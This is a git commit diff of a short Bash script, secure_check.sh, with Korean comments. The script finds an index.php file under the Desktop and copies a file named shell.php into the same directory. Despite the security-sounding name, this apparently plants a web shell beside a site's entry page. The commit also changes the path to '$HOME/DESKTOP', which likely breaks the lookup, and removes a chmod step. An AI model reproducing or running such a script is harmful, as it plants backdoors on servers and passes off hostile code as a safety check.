3a857794e6ad67e2cee80fca92b04901204c28e2
jealoussy <99820621+jealoussy@users.noreply.github.com>
2023-06-22 15:51:57 +0900

    Update secure_check.sh

--- secure_check.sh
+++ secure_check.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Desktop 디렉토리 경로
-desktop_path="$HOME/Desktop"
+# DESKTOP 디렉터리 경로
+desktop_path="$HOME/DESKTOP"
 
-# index.php 파일 검색
+# index.php 파일 경로
 index_file_path=$(find "$desktop_path" -type f -name "index.php" -print -quit)
 
 if [ -z "$index_file_path" ]; then
@@ -11,10 +11,10 @@ if [ -z "$index_file_path" ]; then
   exit 1
 fi
 
-# index.php 파일이 있는 디렉토리 경로
+# index.php 파일이 있는 디렉터리 경로
 index_directory=$(dirname "$index_file_path")
 
-# shell.php 파일 검색
+# shell.php 파일 경로
 shell_file_path=$(find "$desktop_path" -type f -name "shell.php" -print -quit)
 
 if [ -z "$shell_file_path" ]; then
@@ -22,11 +22,7 @@ if [ -z "$shell_file_path" ]; then
   exit 1
 fi
 
-# shell.php 파일 이동 또는 복사
+# shell.php 파일을 index.php가 있는 디렉터리로 이동
 cp "$shell_file_path" "$index_directory"
 
-# 이동한 파일에 실행 권한 부여
-chmod +x "$index_directory/shell.php"
-
 echo "작업이 완료되었습니다."
-
